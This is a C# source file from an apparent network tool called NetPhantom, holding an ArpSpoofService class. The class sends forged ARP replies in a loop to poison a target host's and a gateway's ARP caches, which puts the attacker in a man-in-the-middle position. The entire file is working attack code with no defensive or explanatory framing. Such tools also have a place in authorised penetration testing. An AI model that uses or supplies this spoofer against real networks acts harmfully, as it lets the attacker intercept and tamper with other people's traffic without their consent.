using System.Net;
using System.Net.NetworkInformation;
using System.Threading;
using System.Threading.Tasks;
using PacketDotNet;
using Serilog;
using SharpPcap;

namespace NetPhantom.Services;

/// <summary>
/// Sends periodic ARP Reply packets to poison the ARP cache of a target host.
/// Standard man-in-the-middle pattern: tell target that gateway MAC = our MAC,
/// and tell gateway that target MAC = our MAC.
/// </summary>
public class ArpSpoofService : IDisposable
{
    private readonly ILiveDevice _device;
    private CancellationTokenSource? _cts;
    private Task? _spoofTask;
    private bool _disposed;

    public int PacketsSent { get; private set; }
    public DateTime? LastSentAt { get; private set; }
    public event Action<string>? LogMessage;

    public ArpSpoofService(ILiveDevice device)
    {
        _device = device;
    }

    public void Start(
        string localMac,
        string targetIp,
        string targetMac,
        string gatewayIp,
        int intervalMs = 1000)
    {
        if (_spoofTask is { IsCompleted: false })
            throw new InvalidOperationException("Spoofer already running.");

        PacketsSent = 0;
        _cts = new CancellationTokenSource();
        var ct = _cts.Token;

        _device.Open(DeviceModes.Promiscuous);
        Log.Information("ARP spoof started: target={Target}, gateway={Gateway}", targetIp, gatewayIp);
        LogMessage?.Invoke($"Started spoofing {targetIp} ↔ {gatewayIp}");

        _spoofTask = Task.Run(async () =>
        {
            while (!ct.IsCancellationRequested)
            {
                try
                {
                    // Tell target: gateway IP → our MAC
                    SendArpReply(_device, localMac, gatewayIp, targetIp, targetMac);
                    // Tell gateway: target IP → our MAC
                    SendArpReply(_device, localMac, targetIp, gatewayIp, "FF:FF:FF:FF:FF:FF");

                    PacketsSent += 2;
                    LastSentAt = DateTime.Now;
                    LogMessage?.Invoke($"[{LastSentAt:HH:mm:ss}] Packets sent: {PacketsSent}");
                }
                catch (Exception ex)
                {
                    Log.Error(ex, "ARP spoof send error");
                    LogMessage?.Invoke($"Error: {ex.Message}");
                }

                await Task.Delay(intervalMs, ct).ConfigureAwait(false);
            }
        }, ct);
    }

    public async Task StopAsync()
    {
        _cts?.Cancel();
        if (_spoofTask != null)
            await _spoofTask.ConfigureAwait(false);

        try { _device.Close(); } catch { }

        Log.Information("ARP spoof stopped. Total packets: {Count}", PacketsSent);
        LogMessage?.Invoke($"Stopped. Total packets sent: {PacketsSent}");
    }

    private static void SendArpReply(
        ILiveDevice device,
        string senderMac,
        string senderIp,
        string targetIp,
        string targetMac)
    {
        var senderMacBytes = ParseMac(senderMac);
        var targetMacBytes = targetMac == "FF:FF:FF:FF:FF:FF"
            ? new byte[] { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF }
            : ParseMac(targetMac);

        var arp = new ArpPacket(
            ArpOperation.Response,
            new PhysicalAddress(targetMacBytes),
            IPAddress.Parse(targetIp),
            new PhysicalAddress(senderMacBytes),
            IPAddress.Parse(senderIp));

        var eth = new EthernetPacket(
            new PhysicalAddress(senderMacBytes),
            new PhysicalAddress(targetMacBytes),
            EthernetType.Arp) { PayloadPacket = arp };

        device.SendPacket(eth);
    }

    private static byte[] ParseMac(string mac) =>
        mac.Split(':', '-').Select(p => Convert.ToByte(p, 16)).ToArray();

    public void Dispose()
    {
        if (_disposed) return;
        _disposed = true;
        _cts?.Cancel();
        _cts?.Dispose();
        try { _device.Close(); } catch { }
    }
}
